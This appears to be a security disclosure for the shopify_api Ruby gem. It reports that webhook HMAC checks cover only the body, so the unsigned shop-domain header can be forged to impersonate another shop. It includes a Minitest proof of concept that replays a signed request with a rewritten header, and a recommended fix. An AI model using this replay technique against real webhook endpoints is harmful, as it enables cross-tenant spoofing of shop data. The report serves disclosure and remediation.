### Title
Webhook `shop-domain` / `webhook-id` headers are unauthenticated and excluded from the HMAC signature, allowing cross-tenant shop impersonation - (`lib/shopify_api/webhooks/registry.rb`, `lib/shopify_api/webhooks/request.rb`)

### Summary
`Registry.process` authenticates only the raw request body via HMAC, but dispatches to handlers using `request.shop` and `request.webhook_id`, both of which are read straight from HTTP headers that are never included in the signed content. An attacker who owns a legitimate app installation on their own shop can replay one of their own validly-signed webhook deliveries while swapping the `X-Shopify-Shop-Domain` (and `X-Shopify-Webhook-Id`) header to any victim shop, and `Registry.process` will accept it as authentic.

### Finding Description
The binding that should hold is: `HMAC-validated request` ⇒ `request.shop == the shop that actually produced request.parsed_body`. This binding is broken.

- `Registry.process` only checks the HMAC over the body: `raise ... unless Utils::HmacValidator.validate(request)` at [1](#0-0) , then immediately trusts `request.shop`, `request.topic`, and `request.webhook_id` to build `WebhookMetadata` for the handler.
- `HmacValidator.validate` computes the signature purely from `verifiable_query.to_signable_string`, and `Request#to_signable_string` returns `@raw_body` only [2](#0-1) . Neither `shop`, `topic`, nor `webhook_id` headers are part of the signed string.
- `Request#shop` and `Request#webhook_id` are read directly from attacker-controlled HTTP headers with no cross-check against the body or against any registration state: [3](#0-2) .
- `get_webhook_id`/`unregister` operate on an authenticated `Auth::Session` at registration time [4](#0-3) , but that authenticated linkage between a shop and its webhook subscription is never consulted by `process`. The registry (`@registry`) is keyed only by `topic`, globally, not by shop [5](#0-4) .

Exploit flow: The attacker installs the app on their own shop A (legitimately) and receives a real, correctly-signed webhook (body B, HMAC = HMAC(secret, B)). Because the signature covers only the body, the attacker can resend the exact same body and HMAC while changing only the `X-Shopify-Shop-Domain` header to `victim-shop-b.myshopify.com` (and optionally the `X-Shopify-Webhook-Id` header). `Utils::HmacValidator.validate` still succeeds since the body/signature pair is unchanged, and `Registry.process` calls the handler with `shop: "victim-shop-b.myshopify.com"` even though the payload actually originated from shop A. No code path in `registry.rb`, `request.rb`, or `hmac_validator.rb` cross-checks the header-derived shop against anything established at registration time.

### Impact Explanation
Any host application that keys business logic, database records, or authorization decisions off `WebhookMetadata#shop` (the documented/expected use of this field) can be made to attribute attacker-controlled webhook payloads to an arbitrary victim shop. This is a cross-tenant identity spoof: the unauthenticated `shop` value is trusted as if it were authenticated, matching the Critical "cross-tenant access" category. The attack is repeatable against any target shop domain the attacker chooses to write into the header, for every webhook topic the app has registered a handler for.

### Likelihood Explanation
Preconditions are minimal and fully within reach of an unprivileged attacker as scoped: they only need to install the app on their own development shop to receive one legitimate, correctly signed webhook delivery, then replay it with a rewritten `X-Shopify-Shop-Domain` header directly to the app's webhook endpoint. No secrets, tokens, or victim cooperation are required, and the attack costs a single HTTP request. This is highly likely to be reachable in any real deployment since webhook endpoints are, by design, public HTTP endpoints.

### Recommendation
Include `shop-domain` and `webhook-id` (and ideally `topic`) in the value that is HMAC-verified, or otherwise authenticate the shop domain independently (e.g., verify it against Shopify's known shop list / the session store, not merely the header) before trusting it. At minimum, `Registry.process` should refuse to dispatch if `request.shop` cannot be corroborated against verified registration data for that specific topic/shop.

### Proof of Concept
```ruby
# test/webhooks/registry_cross_tenant_test.rb
require "test_helper"

class RegistryCrossTenantTest < Minitest::Test
  def setup
    ShopifyAPI::Context.setup(
      api_key: "key", api_secret_key: "secret", host: "host",
      scope: "scope", is_embedded: true, is_private: false,
      api_version: "unstable",
    )
    ShopifyAPI::Webhooks::Registry.clear
    @received_shop = nil
    handler = Class.new do
      define_method(:handle) { |data:| @received_shop = data.shop }
    end
    # capture via closure
    @handler_double = Minitest::Mock.new
    ShopifyAPI::Webhooks::Registry.add_registration(
      topic: "products/create", delivery_method: :http, path: "/webhooks",
      handler: FakeHandler.new(self),
    )
  end

  class FakeHandler
    def initialize(test) = @test = test
    def handle(data:) = @test.instance_variable_set(:@received_shop, data.shop)
  end

  def test_forged_shop_header_is_accepted
    raw_body = '{"id":1}'
    secret = ShopifyAPI::Context.api_secret_key
    hmac = Base64.strict_encode64(OpenSSL::HMAC.digest("sha256", secret, raw_body))

    # Legit request from attacker's own shop-A
    legit_request = ShopifyAPI::Webhooks::Request.new(
      raw_body: raw_body,
      headers: {
        "X-Shopify-Topic" => "products/create",
        "X-Shopify-Hmac-Sha256" => hmac,
        "X-Shopify-Shop-Domain" => "shop-a.myshopify.com",
        "X-Shopify-Webhook-Id" => "gid://shopify/WebhookSubscription/1",
        "X-Shopify-Api-Version" => "unstable",
      },
    )
    ShopifyAPI::Webhooks::Registry.process(legit_request)
    assert_equal "shop-a.myshopify.com", @received_shop

    # Forged request: same body/hmac, header claims shop-B and shop-B's webhook_id
    forged_request = ShopifyAPI::Webhooks::Request.new(
      raw_body: raw_body,
      headers: {
        "X-Shopify-Topic" => "products/create",
        "X-Shopify-Hmac-Sha256" => hmac, # unchanged, still valid
        "X-Shopify-Shop-Domain" => "shop-b.myshopify.com", # forged
        "X-Shopify-Webhook-Id" => "gid://shopify/WebhookSubscription/999", # forged
        "X-Shopify-Api-Version" => "unstable",
      },
    )
    ShopifyAPI::Webhooks::Registry.process(forged_request) # does not raise
    assert_equal "shop-b.myshopify.com", @received_shop # BUG: accepted as shop-B
  end
end
```
Both calls to `Registry.process` succeed (no `InvalidWebhookError`), and `@received_shop` is `"shop-b.myshopify.com"` on the second call despite the payload never having been produced by or for shop B, demonstrating the broken binding between HMAC-authenticated content and the trusted `shop` value.
